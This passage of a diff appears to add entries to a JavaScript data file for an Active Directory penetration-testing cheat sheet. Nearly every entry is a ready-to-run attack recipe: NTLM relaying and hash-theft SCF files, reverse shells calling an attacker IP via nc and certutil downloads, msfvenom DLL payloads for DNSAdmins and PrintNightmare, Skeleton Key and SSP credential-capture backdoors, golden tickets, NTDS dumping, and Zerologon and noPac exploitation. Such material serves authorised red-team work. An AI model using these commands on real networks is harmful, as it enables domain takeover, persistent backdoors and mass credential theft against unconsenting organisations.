+impacket-ntlmrelayx -6 -t ldaps://<DC-IP> --no-smb-server -wh fakewpad.<domain> --escalate-user <youruser>
+
+# What triggers authentication:
+# - Domain machines polling for WPAD proxy config (default behavior)
+# - Any machine that broadcasts for a name via DNS
+
+# Results:
+# loot/ directory → ldapdomaindump output (HTML reports)
+# If DA computer auth is relayed to LDAPS → new DA account created automatically
+# Check terminal output for created credentials`,
+    warn: 'mitm6 affects ALL machines on the subnet. Run in short bursts (10-15 min) during business hours. Stop it cleanly or machines may lose IPv6 connectivity temporarily.',
+    ref: 'https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/'
+  },
+  {
+    title: 'URL / SCF File — Force Authentication from Share',
+    req: 'Write access to an SMB share browsed by other users',
+    gets: 'Net-NTLMv2 hashes from any user who opens the folder in Windows Explorer',
+    tags: ['have-username','have-password','proto-smb','proto-network','cat-dump'],
+    cmd: `# When Windows Explorer opens a folder, it auto-resolves icon paths
+# → places a file pointing to our Responder → captures NTLM auth
+
+# Method 1: .scf file (name with @ to stay at top of directory listing)
+printf '[Shell]\nCommand=2\nIconFile=\\\\\\\\<attacker-IP>\\\\share\\\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n' > '@pwn.scf'
+
+# Method 2: .url file
+printf '[InternetShortcut]\nURL=file://<attacker-IP>/share\n' > pwn.url
+
+# Method 3: ntlm_theft — generate ALL file formats at once
+python3 ntlm_theft.py -g all -s <attacker-IP> -f loot
+# Creates: .scf, .url, .lnk, .xll, .doc, .pdf, .m3u variants
+
+# Upload to writable share
+smbclient //<IP>/<share> -U '<domain>/<user>%<pass>'
+smb: \\> put @pwn.scf
+
+# Capture hashes with Responder
+sudo responder -I eth0 -dwv
+
+# Crack Net-NTLMv2
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Good target shares: HR, Finance, IT, Shared, Public
+# The @ prefix keeps the file at the top of dir listing`,
+    note: 'HR and Finance shares get browsed most often. A file named "@Company Policy Update.scf" looks natural and stays at the top of the listing.'
+  },
+  {
+    title: 'adidnsdump — AD-Integrated DNS Enumeration',
+    req: 'Valid domain credentials, LDAP access to DC',
+    gets: 'All DNS records from AD-integrated DNS — reveals internal hosts invisible to standard DNS queries',
+    tags: ['have-username','have-password','proto-ldap','proto-dns','cat-enum'],
+    cmd: `# Dump all DNS records from AD-integrated DNS (stored in AD, readable via LDAP)
+adidnsdump -u '<domain>\\<user>' -p '<pass>' <DC-IP>
+# Output: records.csv
+
+# Show all zones
+adidnsdump -u '<domain>\\<user>' -p '<pass>' <DC-IP> --print-zones
+
+# Resolve hostnames with unknown IPs during dump
+adidnsdump -u '<domain>\\<user>' -p '<pass>' <DC-IP> -r
+
+# PowerView alternative
+Get-DomainDNSRecord -ZoneName <domain>
+Get-DomainDNSZone
+
+# What you find that standard DNS doesn't show:
+# Internal web apps and portals (sharepoint-internal, jenkins, etc.)
+# Database servers (sql-prod, db-backup)
+# CI/CD infrastructure (jenkins, gitlab, teamcity)
+# Management servers (sccm, wsus, nagios)
+# Old decommissioned hosts still in DNS (often unpatched!)
+# Dev / staging environments
+# VPN concentrators and management interfaces`,
+    note: 'Any authenticated user can read AD-integrated DNS via LDAP. It often reveals the entire internal infrastructure map that you wouldn\'t find via port scanning alone.'
+  },
+  {
+    title: 'RunasCs — Execute as Another User (No Interactive Session Required)',
+    req: 'Plaintext credentials for a different domain user, any shell on Windows',
+    gets: 'Code execution in another user\'s security context — bypasses interactive logon requirement',
+    tags: ['have-password','cat-lateral'],
+    cmd: `# Basic command execution as different user
+RunasCs.exe <username> <password> "whoami /all"
+RunasCs.exe <username> <password> "cmd.exe /c net localgroup administrators"
+
+# With domain
+RunasCs.exe <username> <password> "whoami" -d <domain>
+
+# Reverse shell
+RunasCs.exe <username> <password> "cmd.exe /c nc.exe <attacker-IP> 4444 -e cmd.exe"
+RunasCs.exe <username> <password> "powershell -e <base64-payload>"
+
+# Logon type override (important for bypassing network restrictions)
+# Type 2 = Interactive (default — full access but may fail on headless)
+# Type 8 = NetworkCleartext — sends creds over network, bypasses some restrictions
+RunasCs.exe <username> <password> "cmd" -l 8
+# Type 9 = NewCredentials — uses existing token locally, new creds for network auth
+RunasCs.exe <username> <password> "cmd" -l 9
+
+# Remote execution via named pipe
+RunasCs.exe <username> <password> "cmd" -r <remote-hostname>:4444
+
+# Useful when:
+# - WinRM is blocked but you have creds
+# - runas.exe would prompt interactively (RunasCs doesn't)
+# - You need to run BloodHound/tools as a domain user from a SYSTEM shell`,
+    note: 'RunasCs is essential when you have credentials from DPAPI/LSA/description fields but no direct lateral movement path. Useful from SYSTEM shells where Kerberos won\'t work.'
+  },
+  {
+    title: 'PowerShell Remoting — Lateral Movement',
+    req: 'Valid credentials + WinRM enabled (local admin or Remote Management Users)',
+    gets: 'Interactive PS session, file transfer, stateful command execution on remote hosts',
+    tags: ['have-username','have-password','proto-winrm','cat-lateral'],
+    cmd: `# Build credential object
+$SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('domain\\user', $SecPassword)
+
+# One-off command
+Invoke-Command -ComputerName <hostname> -Credential $Cred -ScriptBlock { whoami; ipconfig /all }
+
+# Interactive session
+Enter-PSSession -ComputerName <hostname> -Credential $Cred
+
+# Run a local script file remotely (uploads and executes)
+Invoke-Command -ComputerName <hostname> -Credential $Cred -FilePath .\\PowerView.ps1
+
+# Persistent session — variables survive between invocations
+$sess = New-PSSession -ComputerName <hostname> -Credential $Cred
+Invoke-Command -Session $sess -ScriptBlock { $procs = Get-Process }
+Invoke-Command -Session $sess -ScriptBlock { $procs | Select Name, Id }
+Enter-PSSession -Session $sess
+
+# Load tool into remote session memory, use it
+Invoke-Command -Session $sess -FilePath .\\PowerView.ps1
+Invoke-Command -Session $sess -ScriptBlock { Get-DomainUser | select samaccountname }
+
+# File transfer via PS session (no SMB required)
+Copy-Item -Path .\\SharpHound.exe -Destination 'C:\\Windows\\Temp\\' -ToSession $sess
+Copy-Item -Path 'C:\\Windows\\Temp\\bloodhound.zip' -Destination .\\ -FromSession $sess
+
+# Verify WinRM before connecting
+Test-WSMan -ComputerName <hostname>
+crackmapexec winrm <IP> -u <user> -p <pass>   # (Pwn3d!) = confirmed`,
+    note: 'PS Remoting creates WSMan sessions. Less noisy than psexec (no service creation, no ADMIN$ write). Logs Event ID 4624 on remote host. Good for tooling + lateral movement.'
+  },
+  {
+    title: 'DNSAdmins — Load DLL via DNS Service (→ SYSTEM on DC)',
+    req: 'Membership in the DNSAdmins group, DC is the DNS server (typical)',
+    gets: 'Code execution as SYSTEM on the DC — typically translates to Domain Admin',
+    tags: ['have-username','have-password','proto-dns','proto-smb','cat-privesc'],
+    cmd: `# Step 1: Confirm DNSAdmins membership
+net group "DNSAdmins" /domain
+whoami /groups | findstr DNS
+
+# Step 2: Create malicious DLL (payload: add a domain admin)
+msfvenom -p windows/x64/exec cmd='net group "Domain Admins" hacker /add /domain' -f dll -o malicious.dll
+# Or compile a C# DLL with your payload
+
+# Step 3: Host DLL on attacker SMB share
+impacket-smbserver share $(pwd) -smb2support
+
+# Step 4: Configure DNS to load our DLL at next restart
+dnscmd <DC-hostname> /config /serverlevelplugindll \\\\<attacker-IP>\\share\\malicious.dll
+# Verify the key was set:
+reg query \\\\<DC-hostname>\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll
+
+# Step 5: Restart DNS service (triggers DLL load as SYSTEM)
+sc \\\\<DC-hostname> stop dns
+sc \\\\<DC-hostname> start dns
+# Or if you have local admin / PS Remoting:
+Invoke-Command -ComputerName <DC-hostname> -ScriptBlock { Restart-Service DNS }
+
+# Step 6: Clean up registry key after execution
+reg delete \\\\<DC-hostname>\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll /f`,
+    warn: 'Restarting DNS on the DC causes a brief domain-wide DNS outage. Coordinate with the client or do it during a maintenance window. Cleanup is critical.',
+    note: 'DNSAdmins is a frequently overlooked high-value group — check it in BloodHound or with: Get-ADGroupMember -Identity DNSAdmins'
+  },
+  {
+    title: 'Skeleton Key — Universal Backdoor Password',
+    req: 'Domain Admin (run on the Domain Controller directly)',
+    gets: 'Any user can authenticate with password "mimikatz" — persistent until DC reboots',
+    tags: ['have-domainadmin','proto-kerberos','proto-smb','cat-persist'],
+    cmd: `# Run on the DC (requires DA + debug rights)
+mimikatz.exe "privilege::debug" "misc::skeleton" exit
+
+# Remote via Invoke-Mimikatz:
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC-FQDN>
+
+# After injection — ALL domain accounts accept password: mimikatz
+# (original password still works too)
+
+# Access any machine as any user:
+net use \\\\<server>\\C$ /user:<domain>\\Administrator mimikatz
+Enter-PSSession -ComputerName <any-host> -Credential <domain>\\Administrator
+# Password: mimikatz
+
+# Connect as a specific user (mimikatz password):
+evil-winrm -i <IP> -u <domain>\\<any-user> -p mimikatz
+
+# Verify Skeleton Key is active:
+mimikatz "misc::skeleton" exit    # will show an error if already injected or cleaned
+
+# NOTE: Skeleton Key is IN-MEMORY ONLY
+# Disappears on DC reboot
+# Does not affect Kerberos — only NTLM / MSV authentication`,
+    warn: 'Skeleton Key is in-memory only and detectable by most EDR products monitoring LSASS. It affects ALL domain users — any attacker who knows "mimikatz" gains access during the engagement.'
+  },
+  {
+    title: 'DSRM — Directory Services Restore Mode Abuse',
+    req: 'Domain Admin + DA to modify DC registry',
+    gets: 'Persistent local admin access to DC via DSRM account hash (survives DA password resets)',
+    tags: ['have-domainadmin','proto-smb','cat-persist','cat-lateral'],
+    cmd: `# Every DC has a local Administrator (DSRM) account with its own unique NTLM hash
+# Default: only usable in DSRM mode (offline)
+# Changing DsrmAdminLogonBehaviour allows remote PTH with DSRM hash
+
+# Step 1: Dump DSRM password hash from DC (requires DA)
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC-Name>
+# Or directly on DC:
+mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
+# Look for: local Administrator (RID 500) hash
+
+# Step 2: Enable DSRM remote logon on DC
+# Connect to DC first (psexec/winrm), then set registry:
+New-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD
+# Value 0 = only in DSRM (default)
+# Value 1 = when AD services stopped
+# Value 2 = always (what we want)
+
+# Step 3: PTH with DSRM hash to get local admin on DC
+mimikatz "sekurlsa::pth /domain:<DC-hostname> /user:Administrator /ntlm:<DSRM-hash> /run:cmd.exe" exit
+# In the spawned window:
+dir \\\\<DC-hostname>\\C$
+
+# Or via impacket:
+impacket-psexec '.\\Administrator@<DC-IP>' -hashes :<DSRM-hash>`,
+    note: 'DSRM hash persists even after DA password changes. Great persistence mechanism — once set, access is maintained regardless of domain account changes.'
+  },
+  {
+    title: 'Custom SSP / mimilib — Capture All Future Logins in Plaintext',
+    req: 'SYSTEM or Domain Admin on target (DC for maximum impact)',
+    gets: 'Plaintext credentials of every user who logs in after the SSP is installed',
+    tags: ['have-domainadmin','cat-persist','cat-dump'],
+    cmd: `# Method 1: misc::memssp — in-memory SSP (instant, no reboot, cleared on reboot)
+mimikatz.exe "privilege::debug" "misc::memssp" exit
+# All subsequent logins logged to: C:\\Windows\\System32\\kiwissp.log
+
+# Read captured creds
+type C:\\Windows\\System32\\kiwissp.log
+# Format: [date] Domain:User (NTLM) PlaintextPassword
+
+# Method 2: mimilib.dll — persistent SSP (survives reboots, requires file on disk)
+# Copy mimilib.dll (from mimikatz kit) to C:\\Windows\\System32\\
+
+# Get current security packages
+$packages = Get-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\" -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
+# Add mimilib
+$packages += "mimilib"
+# Set both registry locations
+Set-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\" -Name 'Security Packages' -Value $packages
+Set-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" -Name 'Security Packages' -Value $packages
+# After next reboot: all logons captured to kiwissp.log
+
+# Cleanup: remove mimilib from both registry keys + delete the DLL`,
+    note: 'memssp is immediate but not persistent. mimilib.dll persists across reboots but requires a file on disk (more detectable). Both log credentials in plaintext to kiwissp.log.'
+  },
+  {
+    title: 'SID History Abuse — Child Domain to Root Domain Escalation',
+    req: 'Domain Admin in a child domain + SID filtering NOT enforced on the trust',
+    gets: 'Enterprise Admin equivalent access to the root domain forest',
+    tags: ['have-domainadmin','proto-kerberos','cat-trusts','cat-privesc'],
+    cmd: `# SID History lets you include extra SIDs in your Kerberos ticket
+# Parent-child domain trusts: SID filtering OFF by default
+# Include Enterprise Admins SID (RootDomainSID-519) → root DC treats you as EA
+
+# Step 1: Get domain SIDs
+impacket-lookupsid '<child-domain>/<user>:<pass>@<child-DC-IP>'
+impacket-lookupsid '<root-domain>/<user>:<pass>@<root-DC-IP>'
+# Enterprise Admins = <RootDomainSID>-519
+Get-DomainSID -Domain child.root.domain.local
+Get-DomainSID -Domain root.domain.local
+
+# Step 2: DCSync child domain to get its krbtgt hash
+impacket-secretsdump -just-dc-user krbtgt '<child-domain>/<user>:<pass>@<child-DC-IP>'
+
+# Step 3: Forge Golden Ticket WITH SID History (adds EA SID)
+mimikatz "kerberos::golden /user:Administrator /domain:child.root.domain.local /sid:<ChildSID> /krbtgt:<krbtgt-hash> /sids:<RootDomainSID>-519 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
+
+# Step 4: Access root domain
+dir \\\\dc.root.domain.local\\C$
+impacket-secretsdump -k -no-pass 'root.domain.local/Administrator@dc.root.domain.local'
+
+# Check if SID filtering is enabled:
+Get-DomainTrust | select TrustType,TrustAttributes
+# SID_FILTERING_QUARANTINED in TrustAttributes = filtering ON (blocked)`,
+    note: 'SID filtering is OFF by default for parent-child trusts. It is ON for external/forest trusts. This attack is also known as "Extra SID" or "Forest Privilege Escalation".'
+  },
+  {
+    title: 'Cross-Forest Trust Ticket Attack',
+    req: 'Domain Admin in source domain + bidirectional trust to target forest',
+    gets: 'Access to target forest resources via forged inter-realm TGT',
+    tags: ['have-domainadmin','proto-kerberos','cat-trusts','cat-lateral'],
+    cmd: `# With DA in source domain, dump the inter-forest trust key
+# The trust key is different from krbtgt — it's the shared secret between forests
+
+# Step 1: Dump trust key
+mimikatz "lsadump::trust /patch" exit
+# Look for [In] / [Out] entries with RC4 key for the target forest
+# OR:
+mimikatz "lsadump::lsa /patch" exit
+# Look for accounts like: TARGET_DOMAIN$
+
+# Step 2: Get our domain SID
+impacket-lookupsid '<domain>/<user>:<pass>@<DC-IP>'
+
+# Step 3: Forge inter-realm TGT (authenticates TO target forest)
+mimikatz "kerberos::golden /user:Administrator /domain:<OurDomain> /sid:<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TargetForestDomain> /ticket:trust.kirbi" exit
+
+# Step 4: Request TGS for a service in the target forest
+Rubeus.exe asktgs /ticket:trust.kirbi /service:"cifs/<server.target.forest>" /ptt
+# OR with impacket:
+export KRB5CCNAME=trust.kirbi
+impacket-getST -k -no-pass -spn 'cifs/<server.target.forest>' '<source-domain>/Administrator'
+
+# Step 5: Access target forest resources
+ls \\\\<server.target.forest>\\C$
+
+# Note: SID filtering IS on by default for forest trusts
+# You access resources but cannot escalate to DA in target forest via SID History`,
+    note: 'Forest trust attacks allow lateral movement between forests without compromising the target forest\'s DA. Useful for accessing data in trusted forests.'
+  },
+  {
+    title: 'Shadow Copy — diskshadow NTDS Extraction (LOLBin)',
+    req: 'Local admin on DC or SeBackupPrivilege',
+    gets: 'NTDS.dit + SYSTEM hive → all domain NTLM hashes offline, without file lock issues',
+    tags: ['have-localadmin','have-domainadmin','cat-dump'],
+    cmd: `# diskshadow.exe is a signed Microsoft binary — stealthier than vssadmin
+
+# Create the diskshadow script file
+echo set context persistent nowriters> C:\\Temp\\shadow.txt
+echo set metadata C:\\Temp\\meta.cab>> C:\\Temp\\shadow.txt
+echo set verbose on>> C:\\Temp\\shadow.txt
+echo begin backup>> C:\\Temp\\shadow.txt
+echo add volume C: alias mydrive>> C:\\Temp\\shadow.txt
+echo create>> C:\\Temp\\shadow.txt
+echo expose %mydrive% Z:>> C:\\Temp\\shadow.txt
+echo end backup>> C:\\Temp\\shadow.txt
+
+diskshadow /s C:\\Temp\\shadow.txt
+# Z: is now a shadow copy of C: — files are accessible without VSS lock
+
+dir Z:\\Windows\\NTDS\\
+
+# Copy ntds.dit — use robocopy /b (uses SeBackupPrivilege to bypass NTFS ACL)
+robocopy /b Z:\\Windows\\NTDS\\ C:\\Temp\\ ntds.dit
+reg save HKLM\\SYSTEM C:\\Temp\\system.hive
+reg save HKLM\\SECURITY C:\\Temp\\security.hive
+
+# Download to attacker machine
+*Evil-WinRM*> download C:\\Temp\\ntds.dit
+*Evil-WinRM*> download C:\\Temp\\system.hive
+
+# Parse offline
+impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
+impacket-secretsdump -ntds ntds.dit -system system.hive -security security.hive LOCAL
+
+# Cleanup
+diskshadow /s C:\\Temp\\cleanup.txt   # script with: delete shadows all`,
+    note: 'diskshadow.exe is a LOLBin — a signed, built-in Microsoft tool used for legitimate backup operations. Less likely to be flagged than vssadmin or direct ntds.dit access.'
+  },
+  {
+    title: 'PowerUpSQL — MSSQL Discovery, Audit & Abuse',
+    req: 'Valid domain credentials (SPN enumeration), or direct MSSQL access',
+    gets: 'All MSSQL instances in domain, misconfigs, privilege escalation paths, lateral movement via linked servers',
+    tags: ['have-username','have-password','proto-mssql','proto-ldap','cat-enum','cat-lateral'],
+    cmd: `Import-Module .\\PowerUpSQL.ps1
+
+# Discover all MSSQL instances in domain via SPN enumeration
+Get-SQLInstanceDomain -Verbose
+
+# Test connectivity to discovered instances
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+
+# Get server info (version, login, sysadmin status)
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+
+# Security audit — find misconfigurations
+Invoke-SQLAudit -Instance <Server\\Instance> -Verbose
+# Checks: impersonation, trustworthy databases, public xp_cmdshell, weak passwords, etc.
+
+# Check for and abuse login impersonation (EXECUTE AS LOGIN)
+Invoke-SQLAuditPrivImpersonateLogin -Instance <Server\\Instance> -Verbose
+# If vulnerable: EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'whoami'
+
+# Auto-escalate to sysadmin
+Invoke-SQLEscalatePriv -Instance <Server\\Instance> -Verbose
+
+# Linked server discovery
+Get-SQLServerLink -Instance <Server\\Instance> -Verbose
+
+# Crawl all linked servers recursively (cross-domain!)
+Get-SQLServerLinkCrawl -Instance <Server\\Instance> -Verbose
+
+# Execute OS commands through linked server chain
+Get-SQLServerLinkCrawl -Instance <Server\\Instance> -Query "exec master..xp_cmdshell 'whoami'"`,
+    note: 'SQL linked servers often cross domain trust boundaries — you can jump from a low-priv SQL instance in domain A to a linked server in domain B and run OS commands there.'
+  },
+  {
+    title: 'MSSQL Linked Server — Chained OS Execution',
+    req: 'MSSQL access (any role), target has linked servers configured',
+    gets: 'OS command execution on remote SQL servers — potentially crossing domain boundaries',
+    tags: ['have-password','have-username','proto-mssql','cat-lateral'],
+    cmd: `# Connect to MSSQL
+impacket-mssqlclient '<domain>/<user>:<pass>@<IP>'
+impacket-mssqlclient 'sa:<pass>@<IP>' -windows-auth
+
+# Enumerate linked servers
+SQL> select srvname,srvproduct,datasource from master..sysservers
+SQL> select * from master..sysservers
+
+# Query on linked server
+SQL> select * from openquery("LinkedServer", 'select @@servername, @@version')
+
+# Enable xp_cmdshell on linked server
+SQL> EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "LinkedServer"
+SQL> exec sp_serveroption 'LinkedServer', 'rpc out', 'true'
+
+# OS command execution through linked server
+SQL> EXEC ('xp_cmdshell ''whoami''') AT [LinkedServer]
+SQL> select * from openquery("LinkedServer", 'exec xp_cmdshell ''whoami''')
+
+# Chain execution: Server A → Server B → Server C
+SQL> select * from openquery("ServerB", 'select * from openquery(''ServerC'', ''exec xp_cmdshell ''''whoami'''')')
+
+# Reverse shell via linked server
+SQL> EXEC ('xp_cmdshell ''certutil -urlcache -split -f http://<attacker-IP>/nc64.exe C:\\Users\\Public\\nc64.exe''') AT [LinkedServer]
+SQL> EXEC ('xp_cmdshell ''C:\\Users\\Public\\nc64.exe -e cmd.exe <attacker-IP> 4444''') AT [LinkedServer]`,
+    note: 'SQL Server often runs as NT AUTHORITY\\SYSTEM or a domain service account. Linked servers are frequently configured to run as the SA or a high-privilege account on the remote side.'
+  },
+  {
+    title: 'Zerologon — CVE-2020-1472 (No Creds → Domain Admin)',
+    req: 'Network access to DC on port 445 — NO credentials required',
+    gets: 'All domain NTLM hashes by setting DC machine account password to empty',
+    tags: ['have-nocreds','proto-smb','proto-network','cat-exploit','cat-privesc'],
+    cmd: `# CVE-2020-1472: Netlogon cryptographic flaw — unauthenticated attacker sets DC machine password to empty
+# Affects: Windows Server 2008 R2 through 2019 (unpatched before August 2020)
+
+# Check if vulnerable
+nmap --script smb-vuln-cve-2020-1472 -p 445 <DC-IP>
+python3 zerologon_tester.py <DC-NetBIOS-Name> <DC-IP>
+
+# Exploit: set DC machine account password to empty
+python3 cve-2020-1472-exploit.py <DC-NetBIOS-Name> <DC-IP>
+# DC$ NTLM hash is now: 31d6cfe0d16ae931b73c59d7e0c089c0 (empty password)
+
+# Dump all domain hashes using the empty DC$ hash
+impacket-secretsdump '<domain>/<DC-Name>$'@<DC-IP> -no-pass
+impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 '<domain>/<DC-Name>$@<DC-IP>'
+
+# !!! IMMEDIATELY RESTORE the original DC machine account password !!!
+# Save the original password hex from exploit output, then:
+python3 reinstall_original_pw.py <domain>/<DC-Name> <DC-IP> <original-hex-password>
+# OR via impacket:
+impacket-secretsdump '<domain>/Administrator:<pass>@<DC-IP>' -just-dc-user '<DC-Name>$'
+# Then use the original hash to restore`,
+    warn: 'CRITICAL: Restore the DC machine account password immediately after dumping hashes. Leaving it empty breaks AD replication (KDC will fail) and can cause a domain outage requiring manual recovery.',
+    ref: 'https://github.com/SecuraBV/CVE-2020-1472'
+  },
+  {
+    title: 'PrintNightmare — CVE-2021-34527 (Low User → SYSTEM)',
+    req: 'Valid domain credentials (regular user) + Print Spooler running on target',
+    gets: 'SYSTEM shell on any vulnerable Windows host including Domain Controllers',
+    tags: ['have-username','have-password','proto-smb','cat-exploit','cat-privesc'],
+    cmd: `# CVE-2021-34527: Print Spooler RpcAddPrinterDriverEx allows loading arbitrary DLL as SYSTEM
+# Affects: Windows Server 2008–2022, Windows 10 (unpatched before Aug 2021)
+
+# Check if Print Spooler is running (required on target)
+crackmapexec smb <subnet>/24 -u <user> -p <pass> -M spooler
+# OR:
+sc \\\\<target> query spooler
+
+# Create malicious DLL payload
+msfvenom -p windows/x64/exec cmd='net group "Domain Admins" hacker /add /domain' -f dll -o evil.dll
+# Or reverse shell:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-IP> LPORT=4444 -f dll -o evil.dll
+
+# Host the DLL
+impacket-smbserver share $(pwd) -smb2support
+
+# Exploit from Linux (CVE-2021-1675 PoC)
+python3 CVE-2021-1675.py '<domain>/<user>:<pass>@<target-IP>' '\\\\<attacker-IP>\\share\\evil.dll'
+
+# Exploit from Windows (SharpPrintNightmare)
+SharpPrintNightmare.exe '\\\\<attacker-IP>\\share\\evil.dll' '<DC-IP>'
+
+# Local privilege escalation variant (low-priv local shell → SYSTEM)
+SharpPrintNightmare.exe C:\\Users\\Public\\evil.dll local`,
+    note: 'Very effective against DCs since Print Spooler runs there by default on older systems. The DLL executes as NT AUTHORITY\\SYSTEM.'
+  },
+  {
+    title: 'noPac — CVE-2021-42278 + CVE-2021-42287 (User → DA)',
+    req: 'Valid domain credentials (any regular domain user)',
+    gets: 'Domain Admin via sAMAccountName spoofing — impersonate a DC to get DA TGT',
+    tags: ['have-username','have-password','proto-kerberos','proto-ldap','cat-exploit','cat-privesc'],
+    cmd: `# CVE-2021-42278: machine accounts can rename their own sAMAccountName
+# CVE-2021-42287: when KDC can't find a PAC entry, it appends $ and searches again
+# Combined: rename machine account to match DC name (without $) → request TGT as DC → DCSync
+
+# Affects: all unpatched Windows servers and clients before November 2021 patch
+
+# Check if vulnerable / scan
+python3 scanner.py '<domain>/<user>:<pass>' -dc-ip <DC-IP> -use-ldap
+
+# Exploit — interactive shell as DA
+python3 sam_the_admin.py '<domain>/<user>:<pass>' -dc-ip <DC-IP> -shell
+
+# Exploit — dump hashes directly
+python3 sam_the_admin.py '<domain>/<user>:<pass>' -dc-ip <DC-IP> -dump
+
+# C# implementation (noPac.exe)
+noPac.exe scan -domain <domain> -user <user> -pass <pass> -dc-ip <DC-IP>
+noPac.exe -domain <domain> -user <user> -pass <pass> /dc <DC-hostname> /mAccount FakeMachine /mPassword FakePass! /service cifs /ptt
+dir \\\\<DC-hostname>\\C$
+
+# Requirements check:
+Get-ADDomain | select 'ms-DS-MachineAccountQuota'
+# Must be > 0 (default is 10)`,
+    note: 'noPac is one of the cleanest "regular user → DA" paths. Requires ms-DS-MachineAccountQuota > 0 (default). Check BloodHound for "ms-DS-MachineAccountQuota" value.',
+    ref: 'https://github.com/Ridter/noPac'
+  },
+  {
+    title: 'Certify — ADCS Enumeration & Exploitation (Windows Tool)',
+    req: 'Valid domain credentials, ADCS running in domain',
+    gets: 'Vulnerable certificate templates (ESC1-ESC8) + NT hash of any domain user via certificate auth',
+    tags: ['have-username','have-password','have-adcs','cat-adcs','cat-privesc'],
+    cmd: `# Enumerate all certificate templates for ESC vulnerabilities
+.\\Certify.exe find /vulnerable /quiet
+.\\Certify.exe find /vulnerable /quiet /ca:"<CA-Name>" /domain:<domain>
+
+# ESC Reference:
+# ESC1: Enrollee supplies SAN + Client Auth EKU      → request cert as any user
+# ESC2: Template for any purpose                     → abuse as ESC3
+# ESC3: Certificate Request Agent EKU                → request certs on behalf of others
+# ESC4: You have write perms on template             → modify to expose ESC1
+# ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on CA         → like ESC1 but CA-level
+# ESC7: CA grants Manage CA / Manage Certificates    → add vulnerable template
+# ESC8: CA web enrollment + NTLM auth enabled        → relay DC hash → get DC cert
+
+# Exploit ESC1 — request cert as Administrator
+.\\Certify.exe request /ca:"<CA-hostname>\\<CA-Name>" /template:<VulnerableTemplate> /altname:Administrator
+
+# Convert certificate (PEM → PFX) on Linux
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx -passout pass:
+
+# Request TGT using the certificate (Windows)
+.\\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:"" /nowrap /ptt
+
+# Get NT hash from certificate (Linux)
+certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
+evil-winrm -i <DC-IP> -u Administrator -H <NT-hash>`,
+    note: 'Certify.exe is the Windows tool (C#); Certipy is the Linux equivalent (Python). Both work against the same vulnerabilities. Use Certify when you have a Windows shell.'
+  },
+  {
+    title: 'GPO Abuse — Persist or Escalate via Group Policy',
+    req: 'Write permissions on an existing GPO (CreateChild, WriteProperty, GenericWrite)',
+    gets: 'Persistent code execution as SYSTEM or local admin on all machines in the GPO\'s scope',
+    tags: ['have-username','have-password','proto-smb','proto-ldap','cat-persist','cat-privesc'],
+    cmd: `# Find GPOs you can modify (BloodHound or PowerView)
+Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
+    $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|CreateChild" }
+
+# Find which OUs / computers are affected by a writable GPO
+Get-DomainGPOComputerLocalGroupMapping -GPOIdentity "<GPO-GUID-or-Name>"
+
+# Method 1: SharpGPOAbuse — add user to local Administrators via GPO
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <username> --GPOName "<GPOName>"
+
+# Method 2: SharpGPOAbuse — add persistent startup script
+SharpGPOAbuse.exe --AddComputerScript --ScriptName update.bat --ScriptContents "net user hacker P@ss123 /add && net localgroup administrators hacker /add" --GPOName "<GPOName>"
+
+# Method 3: SharpGPOAbuse — grant dangerous privileges
+SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege,SeImpersonatePrivilege" --UserAccount <username> --GPOName "<GPOName>"
+
+# Method 4: Add immediate scheduled task via GPO
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" --Arguments "/c net user hacker P@ss /add" --GPOName "<GPOName>"
+
+# Force immediate GPO refresh on target (once you have access)
+Invoke-Command -ComputerName <target> -ScriptBlock { gpupdate /force }`,
+    note: 'GPO changes apply to ALL computers in the linked OU — high-impact, affects many machines at once. Default refresh interval is 90 minutes. Verify scope with Get-DomainGPOComputerLocalGroupMapping.'
+  },
+  {
+    title: 'LAPS — Read Local Admin Password',
+    req: 'Valid domain creds with ReadLAPSPassword permission on the target computer object',
+    gets: 'Plaintext local Administrator password for target workstations/servers',
+    tags: ['have-username','have-password','proto-ldap','proto-smb','cat-enum','cat-dump'],
+    cmd: `# Check if LAPS is deployed across the domain
+crackmapexec ldap <DC-IP> -u <user> -p <pass> -M laps
+nxc ldap <DC-IP> -u <user> -p <pass> -M laps
+# Output: COMPUTER01$ -> ms-MCS-AdmPwd: L@ps2024!
+
+# Find which groups/users can read LAPS passwords (PowerView)
+Import-Module .\\PowerView.ps1
